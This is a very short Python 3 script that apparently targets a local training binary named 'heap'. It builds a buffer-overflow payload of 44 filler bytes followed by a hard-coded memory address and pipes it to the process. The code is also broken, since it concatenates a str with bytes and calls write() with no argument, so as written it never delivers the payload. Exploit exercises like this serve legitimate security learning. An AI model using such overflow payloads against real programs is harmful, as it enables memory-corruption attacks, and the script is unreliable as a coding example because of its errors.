#!/usr/bin/python3

from subprocess import Popen, PIPE, STDOUT

x = Popen(['heap'], stdout=PIPE, stdin=PIPE, stderr=STDOUT)

buf = ('A' * 44) + b'\x30\xA0\x04\x08'
x.stdin.write()
